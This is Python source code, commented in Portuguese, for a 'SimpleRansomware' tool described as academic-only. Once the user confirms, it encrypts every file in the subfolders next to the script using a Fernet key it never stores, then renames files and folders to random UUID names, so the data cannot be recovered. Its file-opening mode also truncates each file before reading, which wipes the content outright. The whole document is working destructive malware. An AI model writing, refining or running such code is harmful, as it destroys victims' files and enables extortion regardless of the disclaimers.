from cryptography.fernet import Fernet
from pathlib import Path
import sys
import uuid
import art


class SimpleRansomware:
    """
        - Modelo basico de ransomware destinado apenas para fins academicos
        - Tome cuidado ao executa-lo pois mesmo não salva a chave sendo impossivel recuperar os arquivos
        - Pastas e arquivos seram renomeados e criptografados
    """
    root_folder: Path = Path()

    key = Fernet.generate_key()  # chave de criptografia
    fernet = Fernet(key)

    def welcome(self):
        """ Menu inicial """
        art.tprint(f'{" " * 16} Simple {" " * 16}', "tarty6")
        art.tprint('Ransomware', 'tarty6')
        print(f"{'_' * 13} Ferramenta destinada apenas para fims academicos! {'_' * 13}\n")

        self.danger_menu()

    def danger_menu(self):
        print(
            "Cuidado:\n"
            "Essa ferramneta NÂO salva a chave para recuperar os arquivos, o uso indevido é de sua responsabilidade! \n"
            "Esse Script vai tornar inlegivel tudo que estiver em subpastas na pasta do script. \n"
        )
        option: str = input("Deseja executar essa ferramenta no seu sistema?(y/n)\n").lower()

        self.check_danger_menu_option(option)

    def check_danger_menu_option(self, option: str):
        if option == 'y':
            self.start_attack()
        else:
            print("Saindo...")
            sys.exit()

    def start_attack(self):
        """ Inicia o ataque """
        folders = self.check_subfolders_in_root()

        for folder in folders:
            self.check_files_in_folder(folder)

        self.exit_function()

    def check_subfolders_in_root(self) -> list:
        """ Verifica as subpastas na pasta raiz do script e retorna uma lista com as mesmas """
        folders: list = []

        for item in self.root_folder.iterdir():
            if item.is_dir():
                folders.append(item)

        return folders

    def check_files_in_folder(self, folder: Path):
        """ Executa o ataque nos arquivos da pasta selecionada """
        files: list = [file for file in folder.glob('*') if file.is_file()]

        for file in files:
            self.attack_file_function(file)

        self.rename_item_to_random_name(folder)

    def attack_file_function(self, file_path: Path):
        self.encrypt_file(file_path)
        self.rename_item_to_random_name(file_path)

    def encrypt_file(self, file_path: Path):
        """ Criptografa o arquivo selecionado """
        with open(file_path, "wb+") as file:
            file_data = file.read()
            encrypted_data = self.fernet.encrypt(file_data)
            file.write(encrypted_data)

    def rename_item_to_random_name(self, item_path: Path):
        """ Renomea o item com um nome randomico """
        new_name = self.get_random_name()
        item_path.replace(new_name)

    @staticmethod
    def get_random_name() -> str:
        """ Gera um novo randomico """
        random_name: str = f"{uuid.uuid4()}{uuid.uuid4()}"
        return random_name

    @staticmethod
    def exit_function():
        print("Terminado!!")
        input("Aperte qualquer tecla para continuar...")

    @staticmethod
    def alert():
        print("\nPor questões de segurança esse script não pode ser executado atraves do menu!")
        print("Execute esse script de forma manual, mas antes verifue o script com cautela")


ransomware = SimpleRansomware()

if __name__ == '__main__':
    ransomware.welcome()
